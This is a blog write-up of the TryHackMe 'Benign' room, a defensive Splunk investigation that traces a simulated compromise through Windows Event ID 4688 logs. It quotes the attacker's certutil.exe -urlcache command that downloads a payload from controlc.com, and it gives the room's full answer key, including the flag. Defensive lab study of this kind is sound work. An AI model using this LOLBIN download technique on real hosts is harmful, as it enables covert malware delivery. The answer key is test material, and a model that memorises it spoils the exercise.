---
title: "TryHackMe: Benign — Splunk Investigation"
date: 2026-07-06 18:00:00 +0600
categories: [TryHackMe, SOC]
tags: [splunk, siem, log-analysis, lolbins, windows, incident-response, threat-hunting]
---

## Overview

**Room:** [Benign](https://tryhackme.com/room/benign)  
**Difficulty:** Easy  
**Category:** SOC / Log Analysis / SIEM

A client's IDS flagged a potentially suspicious process execution on a host in the **HR department**. Follow-up investigations revealed network information-gathering tools and scheduled task activity, confirming the compromise. Due to limited resources, only process creation logs (**Event ID 4688**) were pulled and ingested into Splunk under the `win_eventlogs` index.

The objective is to work through those logs as a SOC analyst — using SPL to trace the attacker's actions, identify the compromised user, and reconstruct the full attack chain.

**Skills demonstrated:** Splunk SPL, Windows Event ID 4688 triage, LOLBIN identification, command-line forensics, threat hunting.

---

## Network Segments

Understanding the network layout is essential for scoping the investigation and flagging anomalies:

| Department | Users |
|---|---|
| **IT Department** | James, Moin, Katrina |
| **HR Department** | Haroon, Chris.fort, Diana |
| **Marketing Department** | Bell, Amelia, Deepak |

---

## Initial Triage

First, confirm how much data we're working with:

```spl
index=win_eventlogs
```

This returned **13,959 events** ingested from March 2022 — confirming the full dataset is available before narrowing the search.

![Splunk search showing 13,959 events in the win_eventlogs index](/assets/img/noofevents.png)
_13,959 total events confirmed in the `win_eventlogs` index_

---

## Identifying the Imposter Account

An imposter account was flagged in the IDS alert. The Splunk `rare` command is the fastest way to surface infrequent or unusual usernames across the dataset:

```spl
index=win_eventlogs | rare limit=20 UserName
```

The output returns a familiar list of expected usernames — but one stands out immediately: **`Amel1a`**, using the digit `1` instead of the letter `i`. This is a classic typosquatting attempt impersonating the legitimate user `Amelia` from the Marketing department.

![Splunk rare command output showing Amel1a as an anomalous username](/assets/img/an%20imposter%20account.png)
_The `rare` command surfaces `Amel1a` — a digit-substitution typosquat of `Amelia`_

**MITRE ATT&CK mapping:** T1136.001 (Create Account: Local Account)

---

## Identifying the HR User Running Scheduled Tasks

Scheduled tasks are a common persistence and execution mechanism. The IDS alert pointed to the HR department, so we narrow the search:

```spl
index=win_eventlogs hr schtasks
```

This returns **18 events**. Analysing the `UserName` field reveals the following distribution:

| User | Count | % |
|---|---|---|
| Katrina | 8 | 44.44% |
| James | 5 | 27.78% |
| Moin | 4 | 22.22% |
| **Chris.fort** | **1** | **5.56%** |

The single occurrence of **`Chris.fort`** is the clear anomaly — an HR user running a scheduled task while the rest of the results belong to IT department users. This single-occurrence pattern is exactly what the `rare` command is designed to surface.

![Splunk results showing Chris.fort as the only HR user running scheduled tasks](/assets/img/HR%20Schedule%20Task-2.png)
_`Chris.fort` appears just once in the scheduled task results — a strong outlier signal_

**MITRE ATT&CK mapping:** T1053.005 (Scheduled Task/Job: Scheduled Task)

---

## Identifying the LOLBIN

The room hint directs us to [lolbas-project.github.io](https://lolbas-project.github.io) — a catalogue of Living Off the Land Binaries that attackers use to download payloads, execute code, and bypass security controls using trusted Windows utilities.

To identify which LOLBIN was used, search for rare process names across the dataset:

```spl
index=win_eventlogs | rare limit=20 ProcessName
```

**`certutil.exe`** appears in the results — a built-in Windows command-line utility that is frequently abused via the `-urlcache` flag to download files from the internet, perfectly blending in with legitimate traffic since it's a signed Microsoft binary.

![Splunk rare ProcessName output highlighting certutil.exe as an anomalous process](/assets/img/Download%20a%20payload-2.png)
_`certutil.exe` surfaces as a rare process — immediately suspicious given the HR compromise context_

**MITRE ATT&CK mapping:** T1218 (System Binary Proxy Execution), T1105 (Ingress Tool Transfer)

---

## Identifying the HR User Who Executed the LOLBIN

Now drill into the `certutil.exe` executions to identify the specific HR user:

```spl
index=win_eventlogs ProcessName=C:\Windows\System32\certutil.exe
```

The full Event ID **4688** (process creation) event exposes the exact command line:

```
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

Key fields from this event:

| Field | Value |
|---|---|
| **UserName** | `haroon` |
| **HostName** | `HR_01` |
| **ProcessName** | `C:\Windows\System32\certutil.exe` |
| **CommandLine** | `certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe` |

This confirms **`haroon`** (HR department) executed the LOLBIN to download a payload from an external file-sharing host. The `-urlcache -f` flags instruct certutil to fetch and cache the file, effectively functioning as a wget substitute using a trusted system binary.

![Full Event ID 4688 showing haroon executing certutil.exe with the download command](/assets/img/Download%20a%20payload-4.png)
_The complete 4688 event — `haroon` executing `certutil.exe` with a live C2 URL_

---

## Execution Date

From the same event, the timestamp field gives us the exact execution date:

```
EventTime: 2022-03-04T10:38:28Z
```

![Event timestamp showing the execution date as 2022-03-04](/assets/img/Execution%20time.png)
_Execution confirmed on 2022-03-04 at 10:38 UTC_

---

## Third-Party Site Accessed

The command line exposes the full download URL. The external domain hosting the malicious payload:

```
controlc.com
```

![Splunk event showing controlc.com as the external domain accessed](/assets/img/third%20party.png)
_`controlc.com` — a file-sharing service used as a C2 staging host_

---

## Saved File Name & Full URL

The last argument in the `certutil.exe` command specifies the output filename saved to disk:

```
benign.exe
```

The complete URL the infected host connected to:

```
https://controlc.com/e4d11035
```

![Full URL from the certutil command line showing the complete C2 endpoint](/assets/img/Url%20connected.png)
_The full C2 URL: `https://controlc.com/e4d11035`_

---

## Extracting the Malicious Pattern

The downloaded `benign.exe` file contained a flag embedded in its content with the pattern `THM{..........}`:

```
THM{KJ&*H^B0}
```

> **Note:** the final character is the **digit zero (0)**, not the letter O — a common source of confusion on this room.

![Flag extracted from the downloaded benign.exe payload](/assets/img/flag.png)
_Flag confirmed: `THM{KJ&*H^B0}` — note the digit zero at the end_

---

## Summary of Findings

| # | Question | Answer |
|---|---|---|
| 1 | How many logs are ingested from the month of March, 2022? | `13,959` |
| 2 | Imposter account observed in the logs? | `Amel1a` |
| 3 | Which HR user was running scheduled tasks? | `Chris.fort` |
| 4 | Which HR user executed a LOLBIN to download a payload? | `haroon` |
| 5 | Which system process (LOLBIN) was used to download the payload? | `certutil.exe` |
| 6 | Date the binary was executed (YYYY-MM-DD)? | `2022-03-04` |
| 7 | Which third-party site was accessed? | `controlc.com` |
| 8 | What file was saved on the host from the C2 server? | `benign.exe` |
| 9 | Malicious pattern in the downloaded file? | `THM{KJ&*H^B0}` |
| 10 | Full URL the infected host connected to? | `https://controlc.com/e4d11035` |

---

## Attack Chain Reconstruction

```
1. Attacker gains initial access (not captured in these logs)
   ↓
2. Chris.fort (HR) has a scheduled task executed — anomalous single occurrence
   ↓
3. Haroon (HR) executes certutil.exe (LOLBIN) to download payload
   ↓
4. Payload fetched from controlc.com/e4d11035
   ↓
5. File saved locally as benign.exe
   ↓
6. Malicious content (THM{KJ&*H^B0}) extracted from the downloaded file
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| System Binary Proxy Execution | T1218 | Abuse of `certutil.exe` as a LOLBIN |
| Ingress Tool Transfer | T1105 | Payload downloaded from `controlc.com` |
| Scheduled Task/Job | T1053.005 | Scheduled task activity on HR host |
| Deobfuscate/Decode Files | T1140 | Encoded/obfuscated content in downloaded payload |

---

## Key Takeaways

- **LOLBINs are a critical blind spot.** Attackers don't need to bring their own tools — `certutil.exe`, `bitsadmin.exe`, and others are trusted, often allowlisted binaries that make covert downloads trivial to execute and hard to detect.
- **Typosquatting is subtle but detectable.** `Amel1a` can easily slip past a quick visual scan. Always look for digit-for-letter substitutions when reviewing user account lists.
- **Scheduled tasks signal persistence.** A single anomalous `schtasks` event from an HR user — while IT users dominate the rest — is exactly the kind of signal worth chasing.
- **The `rare` command is a threat hunter's shortcut.** In a 13k+ event dataset, it narrowed the imposter account and the LOLBIN down to seconds of searching rather than hours of scrolling.
- **The full `CommandLine` field tells the whole story.** Event ID 4688 logs contain the exact command executed — URL, parameters, output filename, all of it. Always expand this field first.

---

*Room: [TryHackMe – Benign](https://tryhackme.com/room/benign)*
